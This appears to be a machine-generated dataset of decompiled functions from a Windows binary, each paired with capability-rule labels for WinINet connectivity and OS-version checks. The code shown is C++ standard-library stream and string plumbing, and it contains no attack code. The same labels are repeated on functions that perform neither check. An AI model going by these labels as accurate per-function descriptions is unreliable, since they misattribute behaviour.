{
    "004015f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004015f0(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    char *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    \n    arg_8h = fcn.00420e6f(0);\n    fcn.00420c64(arg_8h);\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar4 = *(*0x444b3c + 0xc);\n    if (*0x444a80 != NULL) {\n        pcVar4 = *0x444a80;\n    }\n    pcVar2 = pcVar4;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = fcn.0041ff97(pcVar2 + (8 - (pcVar4 + 1)));\n    iVar3 = iVar3 - pcVar4;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4[iVar3] = cVar1;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 290
    },
    "00401b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401b60(char *arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    code *var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h != '\\0') {\n        fcn.00424181(0, 0);\n        in_ECX = extraout_ECX;\n    }\n    uVar2 = *(in_ECX + 0x10) & *(in_ECX + 0xc);\n    if ((uVar2 & 4) != 0) {\n        var_4h = fcn.0042001f();\n        arg_8h = \"ios_base::badbit set\";\n        fcn.00421094(&arg_8h);\n        var_8h = 1;\n        var_14h = vtable.std::ios_base::failure.0;\n        uVar2 = fcn.00424181(&var_14h, 0x43f844);\n    }\n    if ((uVar2 & 2) != 0) {\n        uVar3 = fcn.0042001f();\n        arg_8h = \"ios_base::failbit set\";\n        fcn.00421094(&arg_8h);\n        var_8h = 1;\n        var_14h = vtable.std::ios_base::failure.0;\n        var_4h = uVar3;\n        fcn.00424181(&var_14h, 0x43f844);\n    }\n    uVar3 = fcn.0042001f();\n    arg_8h = \"ios_base::eofbit set\";\n    fcn.00421094(&arg_8h);\n    var_8h = 1;\n    var_14h = vtable.std::ios_base::failure.0;\n    var_4h = uVar3;\n    fcn.00424181(&var_14h, 0x43f844);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 479
    },
    "00401db0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401db0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t var_dch;\n    uint var_d0h;\n    uint var_cch;\n    uint var_a4h;\n    int32_t var_78h;\n    code *var_74h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43813b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = &var_dch;\n    fcn.00402730(arg_8h_00, arg_8h);\n    var_4h = 0;\n    if (var_78h != 0) {\n        fcn.00402360(2);\n        if ((*(&var_d0h + *(var_dch + 4)) & 6) == 0) {\n            (**(**(&var_a4h + *(var_dch + 4)) + 0x28))(&var_2ch, 0, 0, 1, 1);\n        }\n        else {\n            var_2ch = *0x439408;\n            var_28h = *0x43940c;\n            var_24h = 0;\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        *unaff_EBX = var_2ch + var_24h;\n        uVar2 = fcn.0041ff97(var_2ch + var_24h);\n        fcn.00402360(0);\n        fcn.00402220(&var_dch, uVar2, *unaff_EBX, *unaff_EBX >> 0x1f);\n        iVar3 = fcn.00403700();\n        if (iVar3 == 0) {\n            iVar3 = *(var_dch + 4);\n            uVar1 = *(&var_d0h + iVar3) | 2;\n            if (*(&var_a4h + iVar3) == 0) {\n                uVar1 = *(&var_d0h + iVar3) | 6;\n            }\n            *(&var_d0h + iVar3) = uVar1 & 0x17;\n            if ((*(&var_cch + iVar3) & uVar1 & 0x17) != 0) {\n                fcn.00401b60(0);\n            }\n        }\n        var_4h = 0xffffffff;\n        fcn.004028a0();\n        var_74h = vtable.std::ios_base.0;\n        fcn.00420285(&var_74h);\n        *in_FS_OFFSET = var_ch;\n        return uVar2;\n    }\n    var_4h = 0xffffffff;\n    fcn.004028a0(arg_8h_00, arg_8h, uVar1);\n    var_74h = vtable.std::ios_base.0;\n    fcn.00420285(&var_74h);\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 796
    },
    "004021a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004021a0(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        iVar1 = (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x34))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    iVar1 = *(*unaff_ESI + 4);\n    if (uVar2 != 0) {\n        uVar2 = *(unaff_ESI + iVar1 + 0xc) | uVar2;\n        if (*(unaff_ESI + iVar1 + 0x38) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        *(unaff_ESI + iVar1 + 0xc) = uVar2 & 0x17;\n        if ((*(unaff_ESI + iVar1 + 0x10) & uVar2 & 0x17) != 0) {\n            fcn.00401b60(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "00402360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402360(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    \n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x28))(&var_1ch, 0, 0, arg_8h, 1);\n        if ((var_14h + var_1ch == *0x439408) && ((var_14h >> 0x1f) + var_18h + CARRY4(var_14h, var_1ch) == *0x43940c)) {\n            iVar1 = *(*unaff_ESI + 4);\n            uVar2 = *(iVar1 + 0xc + unaff_ESI);\n            uVar3 = uVar2 | 2;\n            if (*(unaff_ESI + iVar1 + 0x38) == 0) {\n                uVar3 = uVar2 | 6;\n            }\n            *(unaff_ESI + iVar1 + 0xc) = uVar3 & 0x17;\n            if ((*(unaff_ESI + iVar1 + 0x10) & uVar3 & 0x17) != 0) {\n                fcn.00401b60(0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402521)\n// WARNING: Removing unreachable block (ram,0x0040252e)\n\nint64_t __cdecl\nmethod.std::basic_streambuf_char__struct_std::char_traits_char__.virtual_32\n          (uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar3;\n    int64_t iVar4;\n    \n    if ((-1 < arg_10h) && ((iVar1 = 0,  0 < arg_10h || (iVar1 = 0,  arg_ch != 0)))) {\n        while( true ) {\n            do {\n                iVar4 = fcn.004035d0();\n                if (iVar4 < 1) {\n                    iVar2 = (**(*in_ECX + 0x1c))();\n                    if (iVar2 == -1) {\n                        return iVar1;\n                    }\n                    *arg_8h = iVar2;\n                    iVar1 = iVar1 + 1;\n                    bVar3 = arg_ch != 0;\n                    arg_ch = arg_ch - 1;\n                    arg_10h = arg_10h + -1 + bVar3;\n                    arg_8h = arg_8h + 1;\n                }\n                else {\n                    if (CONCAT44(arg_10h, arg_ch) < iVar4) {\n                        iVar4 = CONCAT44(arg_10h, arg_ch);\n                    }\n                    arg_10h_00 = iVar4;\n                    fcn.00423e20(arg_8h, *in_ECX[8], arg_10h_00);\n                    iVar1 = iVar4 + iVar1;\n                    bVar3 = arg_ch < arg_10h_00;\n                    arg_ch = arg_ch - arg_10h_00;\n                    arg_10h = (arg_10h - (iVar4 >> 0x20)) - bVar3;\n                    *in_ECX[0xc] = *in_ECX[0xc] - arg_10h_00;\n                    *in_ECX[8] = *in_ECX[8] + arg_10h_00;\n                    arg_8h = arg_8h + arg_10h_00;\n                }\n            } while (0 < arg_10h);\n            if (arg_10h < 0) break;\n            if (arg_ch == 0) {\n                return iVar1;\n            }\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 579
    },
    "00402730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00402730(int32_t *arg_8h, uint arg_ch)\n\n{\n    code **arg_8h_00;\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x438112;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = 0x43c410;\n    arg_8h[0x1a] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    iVar4 = *(*arg_8h + 4) + arg_8h;\n    fcn.00401c70(uVar2);\n    arg_8h_00 = arg_8h + 4;\n    *(iVar4 + 0x38) = arg_8h_00;\n    *(iVar4 + 0x3c) = 0;\n    uVar1 = fcn.00403eb0(iVar4);\n    *(iVar4 + 0x40) = uVar1;\n    if ((*(iVar4 + 0x38) == 0) &&\n       (uVar2 = *(iVar4 + 0xc) & 0x17 | 4,  *(iVar4 + 0xc) = uVar2,  (*(iVar4 + 0x10) & uVar2) != 0)) {\n        fcn.00401b60(0);\n    }\n    var_4h = 2;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    fcn.00403c10(arg_8h_00);\n    arg_8h[8] = arg_8h + 6;\n    arg_8h[0xc] = arg_8h + 10;\n    arg_8h[0xd] = arg_8h + 0xb;\n    *arg_8h_00 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x59) = 0;\n    arg_8h[9] = arg_8h + 7;\n    arg_8h[0x10] = arg_8h + 0xe;\n    arg_8h[0x11] = arg_8h + 0xf;\n    arg_8h[7] = 0;\n    *arg_8h[0xd] = 0;\n    *arg_8h[0x11] = 0;\n    *arg_8h[8] = 0;\n    iVar4 = *0x444b5c;\n    *arg_8h[0xc] = 0;\n    *arg_8h[0x10] = 0;\n    arg_8h[0x19] = 0;\n    arg_8h[0x17] = iVar4;\n    arg_8h[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar4 = fcn.00403610(arg_ch);\n    if (iVar4 == 0) {\n        iVar4 = *(*arg_8h + 4);\n        uVar2 = *(iVar4 + 0xc + arg_8h);\n        uVar3 = uVar2 | 2;\n        if (*(arg_8h + iVar4 + 0x38) == 0) {\n            uVar3 = uVar2 | 6;\n        }\n        *(arg_8h + iVar4 + 0xc) = uVar3 & 0x17;\n        if ((*(arg_8h + iVar4 + 0x10) & uVar3 & 0x17) != 0) {\n            fcn.00401b60(0);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 1044
    },
    "004028a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004028a0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x438013;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(*(*(param_1 + -0x68) + 4) + -0x68 + param_1) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    *(param_1 + -0x58) = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    var_4h._0_1_ = 1;\n    var_4h._1_3_ = 0;\n    if ((*(param_1 + -4) != 0) && (**(param_1 + -0x48) == param_1 + -0x10)) {\n        uVar1 = *(param_1 + -0x18);\n        **(param_1 + -0x48) = *(param_1 + -0x1c);\n        **(param_1 + -0x38) = uVar1;\n        **(param_1 + -0x28) = 0;\n    }\n    if (*(param_1 + -8) != '\\0') {\n        fcn.00403700(uVar2);\n    }\n    var_4h = var_4h._1_3_ << 8;\n    fcn.004023e0();\n    *(*(*(param_1 + -0x68) + 4) + -0x10 + param_1 + -0x58) =\n         vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 471
    },
    "00402950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402950(code **param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x437fd8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    if ((param_1[0x15] != NULL) && (*param_1[4] == param_1 + 0x12)) {\n        pcVar1 = param_1[0x10];\n        *param_1[4] = param_1[0xf];\n        *param_1[8] = pcVar1;\n        *param_1[0xc] = 0;\n    }\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.00403700(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.004023e0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 302
    },
    "004033d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033d0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    uint32_t unaff_EBX;\n    int32_t **unaff_ESI;\n    \n    piVar2 = unaff_ESI[4];\n    if (-piVar2 - 1U <= unaff_EBX) {\n        piVar2 = fcn.00420641(\"string too long\");\n    }\n    if (unaff_EBX != 0) {\n        piVar1 = piVar2 + unaff_EBX;\n        if (piVar1 == 0xffffffff) {\n            piVar2 = fcn.00420641(\"string too long\");\n        }\n        if (unaff_ESI[5] < piVar1) {\n            fcn.00403d40(piVar1, piVar2);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            unaff_ESI[4] = NULL;\n            if (0xf < unaff_ESI[5]) {\n                **unaff_ESI = 0;\n                return;\n            }\n            *unaff_ESI = 0;\n            return;\n        }\n        piVar2 = unaff_ESI[4];\n        if (unaff_EBX == 1) {\n            if (unaff_ESI[5] < 0x10) {\n                *(unaff_ESI + piVar2) = arg_8h;\n            }\n            else {\n                *(*unaff_ESI + piVar2) = arg_8h;\n            }\n        }\n        else {\n            ppiVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                ppiVar3 = *unaff_ESI;\n            }\n            fcn.00429890(ppiVar3 + piVar2, arg_8h);\n        }\n        unaff_ESI[4] = piVar1;\n        if (0xf < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar1) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "00403530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00403530(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x438090;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = *(*unaff_EDI + 4) + unaff_EDI;\n    if (*(*(*unaff_EDI + 4) + 0xc + unaff_EDI) == 0) {\n        if (*(iVar2 + 0x3c) != 0) {\n            fcn.004021a0(uVar1);\n        }\n        iVar2 = *(*unaff_EDI + 4) + unaff_EDI;\n        if (*(iVar2 + 0xc) == 0) {\n            *in_FS_OFFSET = var_ch;\n            return 1;\n        }\n    }\n    uVar1 = *(iVar2 + 0xc) | 2;\n    if (*(iVar2 + 0x38) == 0) {\n        uVar1 = *(iVar2 + 0xc) | 6;\n    }\n    *(iVar2 + 0xc) = uVar1 & 0x17;\n    if ((*(iVar2 + 0x10) & uVar1 & 0x17) != 0) {\n        fcn.00401b60(0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 377
    },
    "004035d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004035d0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (**(in_EAX + 0x20) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "004035f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004035f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (**(in_EAX + 0x24) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "00403610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403610(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x438068;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (*(in_ECX + 0x54) == 0) {\n        iVar2 = fcn.0042089f(arg_8h, 0x25, 0x40);\n        if (iVar2 != 0) {\n            uVar4 = 1;\n            fcn.00403790(1);\n            fcn.00403d00(uVar4, uVar1);\n            var_4h = 0;\n            fcn.004040f0();\n            fcn.004039f0();\n            var_4h = 0xffffffff;\n            if (arg_8h != 0) {\n                fcn.00420756(0);\n                iVar2 = *(arg_8h + 4);\n                if ((iVar2 != 0) && (iVar2 != -1)) {\n                    *(arg_8h + 4) = iVar2 + -1;\n                }\n                iVar2 = *(arg_8h + 4);\n                fcn.0042077e();\n                puVar3 = ~-(iVar2 != 0) & arg_8h;\n                if (puVar3 != NULL) {\n                    (***puVar3)(1);\n                }\n            }\n            *in_FS_OFFSET = var_ch;\n            return in_ECX;\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 445
    },
    "00403790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403790(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    \n    *(in_EAX + 0x20) = in_EAX + 0x18;\n    *(in_EAX + 0x50) = arg_8h == 1;\n    *(in_EAX + 0x24) = in_EAX + 0x1c;\n    *(in_EAX + 0x10) = in_EAX + 8;\n    *(in_EAX + 0x30) = in_EAX + 0x28;\n    *(in_EAX + 0x49) = 0;\n    *(in_EAX + 0x14) = in_EAX + 0xc;\n    *(in_EAX + 0x34) = in_EAX + 0x2c;\n    *(in_EAX + 0xc) = 0;\n    **(in_EAX + 0x24) = 0;\n    **(in_EAX + 0x34) = 0;\n    **(in_EAX + 0x10) = 0;\n    **(in_EAX + 0x20) = 0;\n    **(in_EAX + 0x30) = 0;\n    if (in_ECX != 0) {\n        *(in_EAX + 0x10) = in_ECX + 8;\n        *(in_EAX + 0x14) = in_ECX + 8;\n        *(in_EAX + 0x20) = in_ECX;\n        *(in_EAX + 0x24) = in_ECX;\n        *(in_EAX + 0x30) = in_ECX + 4;\n        *(in_EAX + 0x34) = in_ECX + 4;\n    }\n    *(in_EAX + 0x54) = in_ECX;\n    *(in_EAX + 0x4c) = *0x444b5c;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 467
    },
    "00403830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.00403830(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    int32_t *unaff_EBX;\n    uchar *arg_10h;\n    uchar *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437fa8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (((unaff_EBX[0x11] != 0) && (*(unaff_EBX + 0x49) != '\\0')) &&\n       (iVar3 = (**(*unaff_EBX + 0xc))(0xffffffff, var_10h),  iVar3 != -1)) {\n        fcn.00403370();\n        var_4h = 0;\ncode_r0x00403897:\n        puVar5 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar5 = &var_2ch;\n        }\n        puVar6 = var_1ch + puVar5;\n        iVar3 = (**(*unaff_EBX[0x11] + 0x18))(unaff_EBX + 0x13, puVar5, puVar6, &var_30h);\n        if (iVar3 == 0) {\n            *(unaff_EBX + 0x49) = 0;\n        }\n        else if (iVar3 != 1) {\n            if (iVar3 != 3) {\n                fcn.00402150();\n                goto code_r0x004039c3;\n            }\ncode_r0x004039bc:\n            fcn.00402150();\n            goto code_r0x004039c3;\n        }\n        puVar5 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar5 = &var_2ch;\n        }\n        arg_10h = var_30h - puVar5;\n        if (arg_10h != NULL) {\n            puVar5 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar5 = &var_2ch;\n            }\n            puVar6 = arg_10h;\n            puVar4 = fcn.004222be(puVar5, 1, arg_10h, unaff_EBX[0x15]);\n            if (arg_10h != puVar4) {\n                fcn.00402150();\n                goto code_r0x004039c3;\n            }\n        }\n        if (*(unaff_EBX + 0x49) == '\\0') goto code_r0x004039bc;\n        if (arg_10h == NULL) {\n            if ((-var_1ch - 1 < 9) || (uVar1 = var_1ch + 8,  uVar1 == 0xffffffff)) {\n                fcn.00420641(\"string too long\");\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (var_18h < uVar1) {\n                fcn.00403d40(puVar6, var_1ch, uVar1);\n                if (uVar1 == 0) goto code_r0x00403897;\n            }\n            else if (uVar1 == 0) {\n                puVar5 = var_2ch;\n                if (var_18h < 0x10) {\n                    puVar5 = &var_2ch;\n                }\n                var_1ch = uVar1;\n                *puVar5 = 0;\n                goto code_r0x00403897;\n            }\n            puVar5 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar5 = &var_2ch;\n            }\n            *(puVar5 + var_1ch) = 0;\n            *(puVar5 + var_1ch + 4) = 0;\n            puVar5 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar5 = &var_2ch;\n            }\n            var_1ch = uVar1;\n            *(puVar5 + uVar1) = 0;\n        }\n        goto code_r0x00403897;\n    }\ncode_r0x004039c3:\n    *in_FS_OFFSET = var_ch;\n    fcn.00420bc6(var_30h);\n    return;\n}\n",
        "token_count": 1110
    },
    "00403b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403b60(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint32_t arg_10h;\n    \n    if (arg_8h == 0xffffffff) {\n        fcn.00420641(\"string too long\");\n    }\n    uVar1 = in_ECX[5];\n    if (uVar1 < arg_8h) {\n        fcn.00403d40(arg_8h, in_ECX[4]);\n        return arg_8h != 0;\n    }\n    if ((arg_ch != '\\0') && (arg_8h < 0x10)) {\n        arg_10h = in_ECX[4];\n        if (arg_8h < in_ECX[4]) {\n            arg_10h = arg_8h;\n        }\n        if (0xf < uVar1) {\n            arg_ch_00 = *in_ECX;\n            if (arg_10h != 0) {\n                fcn.00423e20(in_ECX, arg_ch_00, arg_10h);\n            }\n            fcn.004220e7(arg_ch_00);\n        }\n        in_ECX[4] = arg_10h;\n        in_ECX[5] = 0xf;\n        *(arg_10h + in_ECX) = 0;\n        return arg_8h != 0;\n    }\n    if (arg_8h == 0) {\n        in_ECX[4] = 0;\n        if (0xf < uVar1) {\n            in_ECX = *in_ECX;\n        }\n        *in_ECX = 0;\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 393
    },
    "00403fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
